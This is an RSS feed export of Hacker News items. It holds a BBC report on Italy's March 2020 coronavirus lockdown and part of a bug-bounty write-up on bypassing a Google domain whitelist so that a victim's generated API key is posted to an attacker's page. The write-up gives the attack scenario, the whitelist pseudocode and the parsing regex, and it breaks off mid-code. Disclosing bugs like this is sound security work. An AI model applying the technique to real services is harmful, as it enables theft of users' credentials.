<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=hnrss.org%2Fnewest%3Fpoints%3D200&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://hnrss.org/newest?points=200" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>Hacker News: Newest</title>
<link>https://news.ycombinator.com/newest</link>
<description>Hacker News RSS</description>
<item>
<title>Italy is extending its coronavirus quarantine measures to the entire country</title>
<link>https://www.bbc.com/news/world-europe-51810673</link>
<guid isPermaLink="true" >https://www.bbc.com/news/world-europe-51810673</guid>
<description>&lt;figure class=&quot;media-landscape has-caption full-width lead&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;
                
                &lt;img class=&quot;js-image-replace&quot; alt=&quot;A tourist wearing a mask sits at the tables of a restaurant in front of the Colosseum, in Rome, Italy, 9 March 2020.&quot; src=&quot;https://ichef.bbci.co.uk/news/320/cpsprodpb/80F2/production/_111201033_mediaitem111201032.jpg&quot; width=&quot;976&quot; height=&quot;549&quot;/&gt;&lt;span class=&quot;off-screen&quot;&gt;Image copyright&lt;/span&gt;
                 &lt;span class=&quot;story-image-copyright&quot;&gt;EPA&lt;/span&gt;
                
            &lt;/span&gt;
            
            &lt;figcaption class=&quot;media-caption&quot;&gt;&lt;span class=&quot;off-screen&quot;&gt;Image caption&lt;/span&gt;
                &lt;span class=&quot;media-caption__text&quot;&gt;
                    Italians have been ordered to stay at home in an attempt to contain the spread of the virus
                &lt;/span&gt;
            &lt;/figcaption&gt;&lt;/figure&gt;&lt;p class=&quot;story-body__introduction&quot;&gt;Italy has extended its emergency coronavirus measures, which include travel restrictions and a ban on public gatherings, to the entire country.&lt;/p&gt;&lt;p&gt;On Monday, Prime Minister Giuseppe Conte ordered people to stay home and seek permission for essential travel.&lt;/p&gt;&lt;p&gt;He said the measures were designed to protect the most vulnerable. &quot;There is no more time,&quot; he said in a TV address.&lt;/p&gt;&lt;p&gt;Italy's coronavirus death toll jumped from 366 to 463 on Monday. It is the worst-hit country after China.&lt;/p&gt;&lt;p&gt;The number of confirmed infection also increased by 24% from Sunday, official figures showed.&lt;/p&gt;&lt;p&gt;Cases of the virus have been confirmed in all 20 Italian regions.  &lt;/p&gt;&lt;h2 class=&quot;story-body__crosshead&quot;&gt;What did Mr Conte say?&lt;/h2&gt;&lt;p&gt;Mr Conte said the best thing was for people to stay at home. &quot;We're having an important growth in infection... and of deaths,&quot; he said in an evening address.&lt;/p&gt;&lt;p&gt;&quot;The whole of Italy will become a protected zone,&quot; he added.&lt;/p&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;
                
                
                
                
                
            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;
                
                
                
                
                
            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;p&gt;&quot;We all must give something up for the good of Italy. We have to do it now.&lt;/p&gt;&lt;p&gt;&quot;This is why I decided to adopt even more strong and severe measures to contain the advance... and protect the health of all citizens.&quot;&lt;/p&gt;&lt;ul class=&quot;story-body__unordered-list&quot;&gt;&lt;li class=&quot;story-body__list-item&quot;&gt;&lt;a href=&quot;https://www.bbc.co.uk/news/world-europe-51803054&quot; class=&quot;story-body__link&quot;&gt;'Italy lockdown cut me off from my husband'&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;In an earlier interview with La Repubblica newspaper, Mr Conte said of the outbreak: &quot;I have been thinking about the old speeches of [Winston] Churchill - it is our darkest hour, but we will make it&quot;.&lt;/p&gt;&lt;h2 class=&quot;story-body__crosshead&quot;&gt;What are the restrictions?&lt;/h2&gt;&lt;p&gt;Mr Conte described the measures as &quot;I stay home&quot; - with people forbidden to gather in public. &quot;No more nightlife; we can't allow this anymore since they are occasions for contagion,&quot; he said.&lt;/p&gt;&lt;p&gt;All sporting events - including football matches - are suspended nationwide. Schools and universities will remain closed until 3 April.&lt;/p&gt;&lt;ul class=&quot;story-body__unordered-list&quot;&gt;&lt;li class=&quot;story-body__list-item&quot;&gt;&lt;a href=&quot;https://www.bbc.co.uk/news/health-51800707&quot; class=&quot;story-body__link&quot;&gt;Coronavirus symptoms 'take five days to show'&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The government said only those with a valid work or family reason that cannot be postponed will be allowed to travel.&lt;/p&gt;&lt;p&gt;Passengers departing on flights will have to justify themselves, as will all those who arrive by plane. &lt;/p&gt;&lt;p&gt;There are controls at train stations to check the temperatures of passengers. Cruise ships are also forbidden to dock at various ports.&lt;/p&gt;&lt;h2 class=&quot;story-body__crosshead&quot;&gt;How have people reacted?&lt;/h2&gt;&lt;p&gt;Earlier on Monday, seven inmates died amid riots at prisons across the country after authorities suspended all visits as part of attempts to control the spread of the disease.&lt;/p&gt;&lt;p&gt;The trouble began in the northern city of Modena at the Sant'Anna prison.&lt;/p&gt;&lt;p&gt;It is thought that at least two of the dead lost their lives to drug overdoses after they raided a prison hospital for the heroin substitute methadone. &lt;/p&gt;&lt;figure class=&quot;media-landscape has-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;
                
                
                
                
                
                 &lt;span class=&quot;off-screen&quot;&gt;Image copyright&lt;/span&gt;
                 &lt;span class=&quot;story-image-copyright&quot;&gt;EPA&lt;/span&gt;
                
            &lt;/span&gt;
            
            &lt;figcaption class=&quot;media-caption&quot;&gt;&lt;span class=&quot;off-screen&quot;&gt;Image caption&lt;/span&gt;
                &lt;span class=&quot;media-caption__text&quot;&gt;
                    Relatives of inmates at the Rebibbia prison in Rome protest at being denied entry
                &lt;/span&gt;
            &lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;At San Vittore prison in Milan, detainees set fire to a cell block, then climbed onto the roof through windows and started waving banners, officials said. &lt;/p&gt;&lt;p&gt;At a prison in the southern city of Foggia, dozens of inmates broke out of the building during protests. Many were quickly recaptured, Italy's Ansa news agency reported. Nine are still missing.&lt;/p&gt;&lt;p&gt;There were also riots at other prisons in northern Italy and at facilities in Naples and  Rome.&lt;/p&gt;&lt;figure class=&quot;media-landscape has-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;
                
                
                
                
                
                 &lt;span class=&quot;off-screen&quot;&gt;Image copyright&lt;/span&gt;
                 &lt;span class=&quot;story-image-copyright&quot;&gt;EPA&lt;/span&gt;
                
            &lt;/span&gt;
            
            &lt;figcaption class=&quot;media-caption&quot;&gt;&lt;span class=&quot;off-screen&quot;&gt;Image caption&lt;/span&gt;
                &lt;span class=&quot;media-caption__text&quot;&gt;
                    Officers guard the entrance of the Sant'Anna prison in Modena as prisoners' relatives protest
                &lt;/span&gt;
            &lt;/figcaption&gt;&lt;/figure&gt;&lt;h2 class=&quot;story-body__crosshead&quot;&gt;How about the rest of the world?&lt;/h2&gt;&lt;p&gt;The number of infections worldwide is now more than 111,000, with about 3,890 deaths.&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.bbc.co.uk/news/world-middle-east-51809818&quot; class=&quot;story-body__link&quot;&gt;Everyone arriving in Israel will be required to self-quarantine&lt;/a&gt; for 14 days, Prime Minister Benjamin Netanyahu announced.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Iran&lt;/strong&gt; has reported 43 new deaths related to the disease in the past 24 hours. &lt;a href=&quot;https://www.bbc.co.uk/news/world-middle-east-51801968&quot; class=&quot;story-body__link&quot;&gt;At least 237 people have died and 7,161 have been infected&lt;/a&gt; across the country since mid-February, although the real figures are believed to be far higher.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;China&lt;/strong&gt;, which has recorded the highest number of fatalities, reported just 40 new cases of Covid-19, the lowest since 20 January.&lt;/p&gt;&lt;p&gt;Although this indicates that the spread there is slowing, senior officials warned against reducing vigilance.&lt;/p&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;
                
                
                
                
                
            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;
                
                
                
                
                
            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;
                
                
                
                
                
            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;
                
                
                
                
                
            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;figure class=&quot;media-landscape no-caption full-width&quot;&gt;&lt;span class=&quot;image-and-copyright-container&quot;&gt;
                
                
                
                
                
            &lt;/span&gt;
            
        &lt;/figure&gt;&lt;p&gt;In other developments: &lt;/p&gt;&lt;ul class=&quot;story-body__unordered-list&quot;&gt;&lt;li class=&quot;story-body__list-item&quot;&gt;The &lt;strong&gt;World Health Organization&lt;/strong&gt; (WHO) has warned that the threat of a pandemic is &quot;very real&quot;&lt;/li&gt;
&lt;li class=&quot;story-body__list-item&quot;&gt;
&lt;strong&gt;Canada &lt;/strong&gt;has confirmed the first death related to the virus - an elderly male patient in a care home in Vancouver, British Columbia&lt;/li&gt;
&lt;li class=&quot;story-body__list-item&quot;&gt;In &lt;strong&gt;France&lt;/strong&gt;, Culture Minister Franck Riester has become the first member of the government to be infected with the virus. His team said he had spent several days of the past week in parliament, where a number of other cases have been confirmed&lt;/li&gt;
&lt;li class=&quot;story-body__list-item&quot;&gt;In the &lt;strong&gt;US&lt;/strong&gt;, the number of confirmed cases now exceeds 500&lt;/li&gt;
&lt;li class=&quot;story-body__list-item&quot;&gt;A cruise ship carrying thousands of people who were stranded for days due to a coronavirus outbreak &lt;a href=&quot;https://www.bbc.com/news/world-us-canada-51796024&quot; class=&quot;story-body__link&quot;&gt;has docked at the port of Oakland&lt;/a&gt;, near San Francisco&lt;/li&gt;
&lt;li class=&quot;story-body__list-item&quot;&gt;
&lt;a href=&quot;https://www.bbc.co.uk/news/business-51796806&quot; class=&quot;story-body__link&quot;&gt;Shares around the world had their worst day&lt;/a&gt; since the financial crisis amid concerns about the economic cost of the outbreak&lt;/li&gt;
&lt;/ul&gt;&lt;hr class=&quot;story-body__line&quot;/&gt;&lt;p&gt;&lt;strong&gt;Have you or someone you know been affected by coronavirus? Share your experiences by emailing &lt;/strong&gt;&lt;a href=&quot;mailto:haveyoursay@bbc.co.uk?subject=coronavirus51777049&quot; class=&quot;story-body__link-email&quot;&gt;&lt;span class=&quot;icon email&quot;/&gt;&lt;span class=&quot;story-body__link-email-text&quot;&gt;haveyoursay@bbc.co.uk&lt;/span&gt;&lt;/a&gt;&lt;strong&gt;.&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Please include a contact number if you are willing to speak to a BBC journalist. You can also contact us in the following ways:&lt;/p&gt;</description>
<pubDate>Mon, 09 Mar 2020 20:52:10 +0000</pubDate>
<dc:creator>colinprince</dc:creator>
<og:title>All of Italy placed under coronavirus lockdown</og:title>
<og:type>article</og:type>
<og:description>The entire population - some 60 million people - are told to stay at home amid the outbreak.</og:description>
<og:url>https://www.bbc.com/news/world-europe-51810673</og:url>
<og:image>https://ichef.bbci.co.uk/news/1024/branded_news/80F2/production/_111201033_mediaitem111201032.jpg</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.bbc.com/news/world-europe-51810673</dc:identifier>
</item>
<item>
<title>The unexpected Google wide domain check bypass</title>
<link>https://bugs.xdavidhu.me/google/2020/03/08/the-unexpected-google-wide-domain-check-bypass/</link>
<guid isPermaLink="true" >https://bugs.xdavidhu.me/google/2020/03/08/the-unexpected-google-wide-domain-check-bypass/</guid>
<description>&lt;p&gt;Hi! Welcome to my first ever writeup! Let me tell you this “funny” story of me trying to bypass a domain check in a little webapp, and acidentally bypassing a URL parser that is used in (almost) every Google product.&lt;/p&gt;
&lt;p&gt;It all started with me sitting at a ‘chill-area’ in 36C3 at December, 2019. I was in the middle of findig a venue for a bug bounty meetup we were trying to organise. After failing horribly, I decided to just sit down and try to hunt for some bugs. I started looking at API documentations, to find some new interesting feature to exploit. I was browsing the GMail API Docs, and came across a button, which generated a GMail API key for you if you pressed it:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://bugs.xdavidhu.me/assets/posts/2020-03-08-the-unexpected-google-wide-domain-check-bypass/henhouse.gif&quot; alt=&quot;The Henhouse App&quot;/&gt;&lt;/p&gt;
&lt;p&gt;This looked interesting, since it seemed like you could perform Google Cloud Console action’s, just by making a victim click on a link. I started investigating.&lt;/p&gt;
&lt;p&gt;I found out that this app that pops up is called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;henhouse&lt;/code&gt;. The GMmail API Documentation embeds the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;henhouse&lt;/code&gt; app as an IFrame. This is the URL that gets loaded in the iFrame:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;https://console.developers.google.com/henhouse/?pb=[&quot;hh-0&quot;,&quot;gmail&quot;,null,[],&quot;https://developers.google.com&quot;,null,[],null,&quot;Create API key&quot;,0,null,[],false,false,null,null,null,null,false,null,false,false,null,null,null,null,null,&quot;Quickstart&quot;,true,&quot;Quickstart&quot;,null,null,false]
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;As you can see, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pb[4]&lt;/code&gt; in the URL is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://developers.google.com&lt;/code&gt;, so the URL of the embedding domain.&lt;/p&gt;
&lt;p&gt;The fact you embed &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;henhouse&lt;/code&gt;, hints that there is some kind of communication between the parent and the children IFrame. This must be the case, since for example you can click the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Done&lt;/code&gt; button to close the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;henhouse&lt;/code&gt; window and go back to the documentation. After a bit of testing, I confirmed that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;henhouse&lt;/code&gt; app sends &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;postMessage&lt;/code&gt;s to the parent domain (more accurately, to the domain specified in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pb[4]&lt;/code&gt;). I also found out that if an API key / OAuth Client ID is generated, it is also sent back to the parent in a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;postMessage&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;At this point I had imagined the whole attack scenario. I embed &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;henhouse&lt;/code&gt; on my own malicious site, and just listen for the victim’s API key arriving in a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;postMessage&lt;/code&gt;. So I did what I had to do, and put my own domain into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pb&lt;/code&gt; object.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://bugs.xdavidhu.me/assets/posts/2020-03-08-the-unexpected-google-wide-domain-check-bypass/whitelist-fail.png&quot; alt=&quot;The Whitelist Fail&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Hmm.. This is not that easy.&lt;/p&gt;
&lt;p&gt;To this day not sure why, but I did not give up, and started reverse-engineering the JavaScript to figure out how this “whitelist” works. I think this is something we all often do, that when our attempt fail, we just think that ‘Okey, they of course thought about this. This is protected. Let’s just search for a differnt bug’. Well, for some reason, this time, I did not do this.&lt;/p&gt;
&lt;p&gt;So after a few hours of untangling obfuscated JavaScript, I got an understanding of how the whitelist works. I made a pseudocode-version for you:&lt;/p&gt;
&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// This is not real code..&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;whitelistedWildcards&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;.corp.google.com&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;.c.googlers.com&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;whitelistedDomains&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;https://devsite.googleplex.com&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;https://developers.google.com&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                          &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;https://cloud-dot-devsite.googleplex.com&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;https://cloud.google.com&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;
                          &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;https://console.cloud.google.com&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;https://console.developers.google.com&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;domainURL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;whitelistedDomains&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;includes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;domainURL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getAuthorityFromMagicRegex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;domainURL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;endsWith&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;whitelistedWildcards&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;API KEY: &lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;apikey&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;domainURL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Bypassing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whitelistedDomains&lt;/code&gt; looked impossible, but for some reason I wanted to dig deeper with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whitelistedWildcards&lt;/code&gt;. So it checks if the &lt;em&gt;parsed&lt;/em&gt; authority (domain) of the URL ends with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.corp.google.com&lt;/code&gt; or with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.c.googlers.com&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Let’s see how the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getAuthorityFromMagicRegex&lt;/code&gt; function looks like:&lt;/p&gt;
&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getAuthorityFromRegex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;domainURL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;magicRegex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;/^&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;(?:([^&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;?#.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;)?(?:\/\/(?:([^/&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;?#&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;)?([^/&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;#?&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;?)(?:&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;0-9&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;))?(?=[/&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;#?&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;|$&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;))?([^&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;?#&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;)?(?:\?([^&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;))?(?:&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;([\s\S]&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;))?&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;$/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;magicRegex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;domainURL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Oof.. That is an ugly regex.. What is in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magicRegex.match(domainURL)[3]&lt;/code&gt;? Let’s see what this regex returns if we try it on a full-featured url in the JS Console:&lt;/p&gt;
&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;https://user:pass@test.corp.google.com:8080/path/to/something?param=value#hash&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;magicRegex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;https://user:pass@test.corp.google.com:8080/path/to/something?param=value#hash&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
